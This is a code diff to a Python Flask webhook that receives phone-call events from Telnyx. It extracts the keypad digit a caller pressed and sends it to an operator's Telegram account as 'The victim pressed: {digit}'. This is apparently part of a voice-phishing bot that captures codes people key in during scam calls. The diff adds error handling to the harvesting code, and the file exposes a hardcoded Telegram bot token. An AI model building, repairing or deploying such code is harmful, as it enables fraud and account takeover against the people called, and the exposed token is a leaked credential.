@@ -9,23 +9,32 @@ TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
 @app.route('/telnyx_webhook', methods=['POST'])
 def telnyx_webhook():
     # Log the incoming request body
-    data = request.json
-    print(f"Received JSON data: {data}")  # Log the entire JSON data
+    try:
+        data = request.json  # Capture the incoming JSON data
+        print(f"Received JSON data: {data}")  # Log the entire JSON data
+    except Exception as e:
+        print(f"Error while reading JSON data: {str(e)}")
+        return 'Error reading JSON', 400
     
     # Extract telegram_user_id from the URL query parameters
     telegram_user_id = request.args.get('telegram_user_id', None)
     print(f"Telegram User ID: {telegram_user_id}")
     
-    # Extract the digit pressed by the victim from the incoming data
-    digit = data.get('data', {}).get('payload', {}).get('digit', None)
+    if not telegram_user_id:
+        return 'No Telegram User ID provided', 400
     
-    # Log the digit pressed (if available)
-    if digit:
+    # Extract the digit pressed by the victim from the incoming data
+    try:
+        digit = data.get('data', {}).get('payload', {}).get('digit', None)
         print(f"Digit Pressed: {digit}")
-        # Call the function to send the message to the Telegram bot
-        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
-    else:
-        print("No digit pressed.")
+        
+        if digit:
+            send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
+        else:
+            print("No digit pressed.")
+    except KeyError as e:
+        print(f"Error extracting digit: {str(e)}")
+        return 'Error processing digit', 400
     
     # Optionally, log the entire payload or any other part of the data
     payload = data.get('data', {}).get('payload', {})
@@ -44,9 +53,6 @@ def send_telegram_message(user_id, message):
     
     # Log the response for debugging
     print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}, Response Text: {response.text}")
-
-    print(response.status_code)
-    print(response.text)
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
